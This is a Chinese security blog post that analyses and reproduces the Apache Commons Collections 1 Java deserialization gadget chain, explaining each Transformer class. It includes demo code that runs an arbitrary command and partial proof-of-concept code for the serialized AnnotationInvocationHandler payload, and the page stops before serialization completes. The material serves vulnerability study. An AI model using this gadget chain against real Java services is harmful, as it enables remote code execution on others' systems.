<!doctype html><html lang=zh><head><meta http-equiv=content-type content="text/html" charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=/css/tailwind.min.b39a406edef2cbbd2ccee2cbd368a787bfad3ac016440c2b37558902050cf85d.css integrity=sha256-s5pAbt7yy70szuLL02inh7+tOsAWRAwrN1WJAgUM+F0=><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Lora&display=swap" rel=stylesheet><script src=https://kit.fontawesome.com/9cc9e9e3f3.js crossorigin=anonymous></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/docsearch.js@2.6.3/dist/cdn/docsearch.min.css><title>Commons Collections 1 复现</title></head><body class="flex flex-col"><header class="flex fixed bg-white w-full p-4 font-title text-xl border-b"><div class="logo flex-1"><a href=/ class=font-title>Forgotten Land</a></div><nav class="flex-initial ml-4"><div id=归档 class=inline><a href=/metapages/archive/ class="mx-2 hover:text-blue-200">归档</a></div><div id=分类 class=inline><a href=/categories/ class="mx-2 hover:text-blue-200">分类</a><div class=absolute></div></div><div id=标签 class=inline><a href=/tags/ class="mx-2 hover:text-blue-200">标签</a></div><div id=关于 class=inline><a href=/metapages/about/ class="mx-2 hover:text-blue-200">关于</a></div></nav></header><div class="flex-grow mt-24"><div class=flex><div class="md:w-4/5 lg:w-2/3 max-w-screen-lg mx-auto p-4 shadow-2xl"><h1 class="font-title text-4xl text-center mb-4">Commons Collections 1 复现</h1><div class="flex justify-center font-mono"><div class="mr-6 flex-none"><i class="fas fa-calendar mr-1"></i>
<span>2021-04-28</span></div><div class="mr-6 flex-none"><i class="fas fa-clock mr-1"></i>
<span>阅读时长约 10 分钟</span></div></div><article class=content><h2 id=利用链分析>利用链分析</h2><p>先看一眼gadget chain：</p><pre><code>/*
   Gadget chain:
      ObjectInputStream.readObject()
         AnnotationInvocationHandler.readObject()
            Map(Proxy).entrySet()
               AnnotationInvocationHandler.invoke()
                  LazyMap.get()
                     ChainedTransformer.transform()
                        ConstantTransformer.transform()
                        InvokerTransformer.transform()
                           Method.invoke()
                              Class.getMethod()
                        InvokerTransformer.transform()
                           Method.invoke()
                              Runtime.getRuntime()
                        InvokerTransformer.transform()
                           Method.invoke()
                              Runtime.exec()

   Requires:
      commons-collections
 */
</code></pre><p>参考这个利用链，其利用的关键在于几个Transformer，所以先来关注这几个类的方法的详细信息：</p><h3 id=chainedtransformer>ChainedTransformer</h3><p>根据描述，这个类的作用对一个对象经过一个Transformer链依次处理，其构造方法是一个Transformer数组，也就是使用这个数组中的Transformer对对象进行处理：<img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/cc1/image-20210428113221303.png alt=image-20210428113221303></p><p>看看transform：<img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/cc1/image-20210428113254466.png alt=image-20210428113254466></p><p>对对象依次经过各个Transform处理，每次的返回作为下一次的输入。</p><h3 id=constanttransformer>ConstantTransformer</h3><p>根据描述，这个类的作用是返回一个指定的类型，看看构造方法：<img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/cc1/image-20210428112730316.png alt=image-20210428112730316></p><p>这个类只接受一个参数，就是需要返回的类型，而这个类的transform也只是返回iConstant，所以就不再看了。</p><p>根据这个类的特性，可以猜测这个类是为了在利用链中获取到一个指定的类型。</p><h3 id=invokertransformer>InvokerTransformer</h3><p>根据描述，这个类的作用是通过反射创建一个实例对象，先看看构造方法：<img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/cc1/image-20210428104722432.png alt=image-20210428104722432></p><p>这里接受三个参数，第一个参数是一个字符串，表示方法名称；第二个则是参数类型的Class数组，第三个是参数。这里可以看出，这个类的作用是应该是使用反射创建一个方法的对象实例，可能将会使用这个方法来处理传进来的对象。</p><p>所以接着来看看transform方法：<img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/cc1/image-20210428105149484.png alt=image-20210428105149484></p><p>确实与猜测的一致，首先是使用反射获取到输入对象的方法，然后使用这个对象调用方法。</p><p>所以说，通过这个类可以让对象执行一个指定的方法，并控制传入的参数；那么为了能够让这个类执行一个命令执行，就要构造一个对象，对于一个最常见的命令执行来说，一般是由<code>java.lang.runtime.getRuntime().exec("cmd")</code>构成，所以上面的各个参数应该对应于：</p><ul><li>input=&ldquo;java.lang.runtime.getRuntime()&rdquo;</li><li>iMethodName=&ldquo;exec&rdquo;</li><li>iParamTypes=&ldquo;String.class&rdquo;</li><li>iArgs=&ldquo;cmd&rdquo;</li></ul><h3 id=transformer-构造链>Transformer 构造链</h3><p>结合上面三个类，大概可以知道如何构造出一个命令执行了：</p><ul><li>使用 ConstantTransformer 固定获得一个 runtime 类</li><li>使用 InvokerTransformer 模拟 <code>java.lang.runtime.getRuntime().exec("cmd")</code></li><li>使用 ChainedTransformer 将几个 Transforemer 联系起来</li></ul><p>所以可以得到部分代码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>        <span style=color:#66d9ef>final</span> Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
                <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
            	<span style=color:#75715e>// 获取到 Runtime 的 Class 并向下传递
</span><span style=color:#75715e></span>                <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getMethod&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
                        String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Class<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span> <span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
                                <span style=color:#e6db74>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>}),</span>
   				<span style=color:#75715e>// 利用反射获取到 Runtime.getRuntime()
</span><span style=color:#75715e></span>                <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;invoke&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
                        Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Object<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span> <span style=color:#f92672>},</span><span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
                                <span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>}),</span>
            	<span style=color:#75715e>// 继续利用反射获取 invoke()
</span><span style=color:#75715e></span>                <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span> <span style=color:#e6db74>&#34;exec&#34;</span><span style=color:#f92672>,</span>
                        <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> args<span style=color:#f92672>)</span>
                <span style=color:#75715e>// 执行 exec
</span><span style=color:#75715e></span>        <span style=color:#f92672>};</span>
		ChainedTransformer transformerChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>transformers<span style=color:#f92672>);</span>

</code></pre></div><p>对上面的代码解释一下：</p><ol><li>首先是创建一个Transformer[]数组，这是为了传递给ChainedTransformer；</li><li>第一个Transformer是ConstantTransformer(Runtime.class)，根据这个类的描述，这个Transformer执行返回的是Runtime的Class；</li><li>接下来第一个InvokerTransformer接受到Class，然后执行的是getMethod方法，也就是说这里是模拟反射（Runtime.class.getMethod(&ldquo;getRuntime&rdquo;)）的过程，获取到getRuntime()方法；</li><li>接下来第二个的InvokerTransformer接受到Method getRuntime，于是使用invoke，模拟getRuntime.invoke(null)方法，到这一步可以就可以获取到Runtime对象；</li><li>最后一个InvokerTransformer就是模拟命令执行的过程了。</li></ol><p>总结来说，这部分代码相当于是执行了下列过程：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>Class runtimeClass <span style=color:#f92672>=</span> Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>;</span>
Method getRuntime <span style=color:#f92672>=</span> runtimeClass<span style=color:#f92672>.</span><span style=color:#a6e22e>getMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getRuntime&#34;</span><span style=color:#f92672>);</span>
Runtime runtime <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Runtime<span style=color:#f92672>)</span> getRuntime<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span><span style=color:#66d9ef>null</span><span style=color:#f92672>);</span>
runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>args<span style=color:#f92672>);</span>
</code></pre></div><p>OK，现在已经得到触发代码执行的利用链了，接下来就是如何触发这段代码。</p><h3 id=map调用>Map调用</h3><p>通过分析利用链，可以知道触发位置应该是在：</p><pre><code>                  LazyMap.get()
</code></pre><p>参考ysoserial的gadget，可以写出下面的代码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>final</span> Map innerMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>();</span>
<span style=color:#66d9ef>final</span> Map lazyMap <span style=color:#f92672>=</span> LazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>decorate</span><span style=color:#f92672>(</span>innerMap<span style=color:#f92672>,</span> transformerChain<span style=color:#f92672>);</span>
lazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>);</span>
</code></pre></div><p>这里关键在后两个：decorate方法和get方法。首先看decorate，这个方法会使用Factory来创建一个LazyMap，其中会将我们构造的transformerChain作为factory：</p><p><img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/cc1/image-20210510112607705.png alt=image-20210510112607705></p><p>接下来是get：<img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/cc1/image-20210510112703544.png alt=image-20210510112703544></p><p>可以看出，如果我们get一个不存在的键值，就会使用我们前面构造的transform，这就意味着序列化命令将会执行。</p><h2 id=demo测试>Demo测试</h2><p>根据上面的分析，可以写出一个Demo：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#f92672>package</span> top.causality.vulns<span style=color:#f92672>;</span>

<span style=color:#f92672>import</span> org.apache.commons.collections.Transformer<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> org.apache.commons.collections.map.LazyMap<span style=color:#f92672>;</span>

<span style=color:#f92672>import</span> java.util.HashMap<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> java.util.Map<span style=color:#f92672>;</span>

<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CC1</span> <span style=color:#f92672>{</span>

    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>

        <span style=color:#66d9ef>final</span> String<span style=color:#f92672>[]</span> execArgs <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span> args<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>};</span>

        <span style=color:#66d9ef>final</span> Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]{</span>
                <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
                <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getMethod&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>
                        String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Class<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span>
                        <span style=color:#e6db74>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>
                <span style=color:#f92672>}),</span>
                <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;invoke&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>
                        Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Object<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span>
                        <span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>
                <span style=color:#f92672>}),</span>
                <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;exec&#34;</span><span style=color:#f92672>,</span>
                        <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> execArgs
                <span style=color:#f92672>),</span>
        <span style=color:#f92672>};</span>
        <span style=color:#66d9ef>final</span> Transformer transformerChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>transformers<span style=color:#f92672>);</span>

        <span style=color:#66d9ef>final</span> Map innerMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>();</span>
        <span style=color:#66d9ef>final</span> Map lazyMap <span style=color:#f92672>=</span> LazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>decorate</span><span style=color:#f92672>(</span>innerMap<span style=color:#f92672>,</span> transformerChain<span style=color:#f92672>);</span>
        lazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>测试环境要求commons-collections&lt;3.2.2，这里使用jdk7u80（jdk8u291）和commons-collections 3.2.1：</p><p>直接调试运行：<img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/cc1/image-20210510113345829.png alt=image-20210510113345829></p><p>Windows下参数设置calc，运行会调用出计算器。</p><h2 id=构造poc>构造PoC</h2><p>这里虽然可以运行Demo弹出一个计算器，但是这里弹出计算器这个操作是由lazyMap.get()触发的，而这个操作并不会在反序列化过程中触发，继续看PoC可以知道这个触发过程：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>AnnotationInvocationHandler<span style=color:#f92672>.</span><span style=color:#a6e22e>readObject</span><span style=color:#f92672>()</span>
   Map<span style=color:#f92672>(</span>Proxy<span style=color:#f92672>).</span><span style=color:#a6e22e>entrySet</span><span style=color:#f92672>()</span>
      AnnotationInvocationHandler<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>()</span>
         LazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>()</span>
</code></pre></div><blockquote><p>这个逻辑其实有点难想到，这里参考p牛提供的一个思路。</p><p>为了能够触发lazyMap.get()方法，首先需要寻找一个在readObject()中触发这个操作的类；而AnnotationInvocationHandler类的readObject就会对Map进行操作，但是仔细阅读这个方法就会发现这里没有调用到get()，但是发现invoke()方法中存在get()，所以就要想办法调用这个invoke()。那么问题就转移到了如何调用invoke()，这就会自然的想到使用Proxy，因为任何时候调用Proxy对象的方法，invoke()都会被调用。</p></blockquote><p>逻辑已经清晰了，但是还是可以简单看看几个方法的代码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span><span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ObjectInputStream</span> s<span style=color:#f92672>)</span>
        <span style=color:#66d9ef>throws</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>.</span><span style=color:#a6e22e>IOException</span><span style=color:#f92672>,</span> ClassNotFoundException <span style=color:#f92672>{</span>
        s<span style=color:#f92672>.</span><span style=color:#a6e22e>defaultReadObject</span><span style=color:#f92672>();</span>
	<span style=color:#75715e>// Check to make sure that types have not evolved incompatibly
</span><span style=color:#75715e></span>
    AnnotationType annotationType <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
    <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
        annotationType <span style=color:#f92672>=</span> AnnotationType<span style=color:#f92672>.</span><span style=color:#a6e22e>getInstance</span><span style=color:#f92672>(</span>type<span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span><span style=color:#f92672>(</span>IllegalArgumentException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
        <span style=color:#75715e>// Class is no longer an annotation type; all bets are off
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>return</span><span style=color:#f92672>;</span>
    <span style=color:#f92672>}</span>

    Map<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>,</span> Class<span style=color:#f92672>&lt;?&gt;&gt;</span> memberTypes <span style=color:#f92672>=</span> annotationType<span style=color:#f92672>.</span><span style=color:#a6e22e>memberTypes</span><span style=color:#f92672>();</span>

    <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span>Map<span style=color:#f92672>.</span><span style=color:#a6e22e>Entry</span><span style=color:#f92672>&lt;</span>String<span style=color:#f92672>,</span> Object<span style=color:#f92672>&gt;</span> memberValue <span style=color:#f92672>:</span> memberValues<span style=color:#f92672>.</span><span style=color:#a6e22e>entrySet</span><span style=color:#f92672>())</span> <span style=color:#f92672>{</span>
        String name <span style=color:#f92672>=</span> memberValue<span style=color:#f92672>.</span><span style=color:#a6e22e>getKey</span><span style=color:#f92672>();</span>
        Class<span style=color:#f92672>&lt;?&gt;</span> memberType <span style=color:#f92672>=</span> memberTypes<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>name<span style=color:#f92672>);</span>
        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>memberType <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>  <span style=color:#75715e>// i.e. member still exists
</span><span style=color:#75715e></span>            Object value <span style=color:#f92672>=</span> memberValue<span style=color:#f92672>.</span><span style=color:#a6e22e>getValue</span><span style=color:#f92672>();</span>
            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(!(</span>memberType<span style=color:#f92672>.</span><span style=color:#a6e22e>isInstance</span><span style=color:#f92672>(</span>value<span style=color:#f92672>)</span> <span style=color:#f92672>||</span>
                  value <span style=color:#66d9ef>instanceof</span> ExceptionProxy<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
                memberValue<span style=color:#f92672>.</span><span style=color:#a6e22e>setValue</span><span style=color:#f92672>(</span>
                    <span style=color:#66d9ef>new</span> AnnotationTypeMismatchExceptionProxy<span style=color:#f92672>(</span>
                        value<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;[&#34;</span> <span style=color:#f92672>+</span> value <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;]&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>setMember</span><span style=color:#f92672>(</span>
                            annotationType<span style=color:#f92672>.</span><span style=color:#a6e22e>members</span><span style=color:#f92672>().</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>name<span style=color:#f92672>)));</span>
            <span style=color:#f92672>}</span>
        <span style=color:#f92672>}</span>
    <span style=color:#f92672>}</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>在<code>for (Map.Entry&lt;String, Object> memberValue : memberValues.entrySet()) </code>中调用了memberValues.entrySet()，而memberValues就是反序列化的Map对象，因此这里就会触发invoke：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>Object proxy<span style=color:#f92672>,</span> Method method<span style=color:#f92672>,</span> Object<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    String member <span style=color:#f92672>=</span> method<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>();</span>
    Class<span style=color:#f92672>&lt;?&gt;[]</span> paramTypes <span style=color:#f92672>=</span> method<span style=color:#f92672>.</span><span style=color:#a6e22e>getParameterTypes</span><span style=color:#f92672>();</span>

    <span style=color:#75715e>// Handle Object and Annotation methods
</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>member<span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;equals&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> paramTypes<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span> <span style=color:#f92672>==</span> 1 <span style=color:#f92672>&amp;&amp;</span>
        paramTypes<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>==</span> Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>)</span>
        <span style=color:#66d9ef>return</span> equalsImpl<span style=color:#f92672>(</span>args<span style=color:#f92672>[</span>0<span style=color:#f92672>]);</span>
    <span style=color:#66d9ef>assert</span> paramTypes<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span> <span style=color:#f92672>==</span> 0<span style=color:#f92672>;</span>
    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>member<span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;toString&#34;</span><span style=color:#f92672>))</span>
        <span style=color:#66d9ef>return</span> toStringImpl<span style=color:#f92672>();</span>
    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>member<span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;hashCode&#34;</span><span style=color:#f92672>))</span>
        <span style=color:#66d9ef>return</span> hashCodeImpl<span style=color:#f92672>();</span>
    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>member<span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;annotationType&#34;</span><span style=color:#f92672>))</span>
        <span style=color:#66d9ef>return</span> type<span style=color:#f92672>;</span>

    <span style=color:#75715e>// Handle annotation member accessors
</span><span style=color:#75715e></span>    Object result <span style=color:#f92672>=</span> memberValues<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>member<span style=color:#f92672>);</span>

    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>result <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span>
        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IncompleteAnnotationException<span style=color:#f92672>(</span>type<span style=color:#f92672>,</span> member<span style=color:#f92672>);</span>

    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>result <span style=color:#66d9ef>instanceof</span> ExceptionProxy<span style=color:#f92672>)</span>
        <span style=color:#66d9ef>throw</span> <span style=color:#f92672>((</span>ExceptionProxy<span style=color:#f92672>)</span> result<span style=color:#f92672>).</span><span style=color:#a6e22e>generateException</span><span style=color:#f92672>();</span>

    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>result<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>isArray</span><span style=color:#f92672>()</span> <span style=color:#f92672>&amp;&amp;</span> Array<span style=color:#f92672>.</span><span style=color:#a6e22e>getLength</span><span style=color:#f92672>(</span>result<span style=color:#f92672>)</span> <span style=color:#f92672>!=</span> 0<span style=color:#f92672>)</span>
        result <span style=color:#f92672>=</span> cloneArray<span style=color:#f92672>(</span>result<span style=color:#f92672>);</span>

    <span style=color:#66d9ef>return</span> result<span style=color:#f92672>;</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>invoke方法中有memberValues.get()，所以在这里就会触发前面的构造的transformer链。</p><p>OK，接下来就是构造PoC了，根据这个原理，首先要创建一个AnnotationInvocationHandler，然后创建一个代理，然后再创建一个AnnotationInvocationHandler（目的是调用readObject）：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>Class cls <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style=color:#f92672>);</span>
Constructor constructor <span style=color:#f92672>=</span> cls<span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredConstructor</span><span style=color:#f92672>(</span>Class<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
InvocationHandler handler <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>InvocationHandler<span style=color:#f92672>)</span> constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>Retention<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> lazyMap<span style=color:#f92672>);</span>

Map proxyMap <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Map<span style=color:#f92672>)</span> Proxy<span style=color:#f92672>.</span><span style=color:#a6e22e>newProxyInstance</span><span style=color:#f92672>(</span>Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getClassLoader</span><span style=color:#f92672>(),</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> handler<span style=color:#f92672>);</span>
handler <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>InvocationHandler<span style=color:#f92672>)</span> constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>Retention<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> proxyMap<span style=color:#f92672>);</span>
</code></pre></div><p>到此关键就结束了，只需要对这个handler进行序列化就可以了。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>ByteArrayOutputStream baos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayOutputStream<span style=color:#f92672>();</span>
ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream<span style=color:#f92672>(</span>baos<span style=color:#f92672>);</span>
